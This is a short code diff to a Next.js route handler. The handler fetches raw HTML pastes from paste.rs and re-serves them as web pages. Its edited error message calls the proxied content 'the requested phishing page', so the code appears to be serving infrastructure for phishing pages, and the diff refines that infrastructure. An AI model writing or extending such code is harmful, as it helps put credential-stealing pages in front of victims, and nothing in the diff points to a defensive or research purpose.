@@ -12,17 +12,19 @@ export async function GET(req: NextRequest, { params }: { params: { id: string }
     try {
         // Fetch the raw HTML content from paste.rs on the server-side.
         const pasteRsResponse = await fetch(`https://paste.rs/raw/${id}`);
+        
         if (!pasteRsResponse.ok) {
             // Check if the content type suggests it's an error from paste.rs
+            // A not-found page on paste.rs returns HTML. A raw paste returns text/plain.
             const contentType = pasteRsResponse.headers.get('content-type');
             if (contentType && contentType.includes('text/html')) {
-                 return new NextResponse(`<html><body>Page not found or expired on hosting service.</body></html>`, { status: 404, headers: { 'Content-Type': 'text/html; charset=utf-8' } });
+                 return new NextResponse(`<html><body><h1>404 - Page Not Found</h1><p>The requested phishing page was not found on the hosting service. It may have expired or the link is incorrect.</p></body></html>`, { status: 404, headers: { 'Content-Type': 'text/html; charset=utf-8' } });
             }
             // Handle other potential errors from paste.rs
             return new NextResponse(`Failed to fetch content from hosting service. Status: ${pasteRsResponse.status}`, { status: 502 });
         }
         
-        let originalHtml = await pasteRsResponse.text();
+        const originalHtml = await pasteRsResponse.text();
 
         return new NextResponse(originalHtml, {
             status: 200,
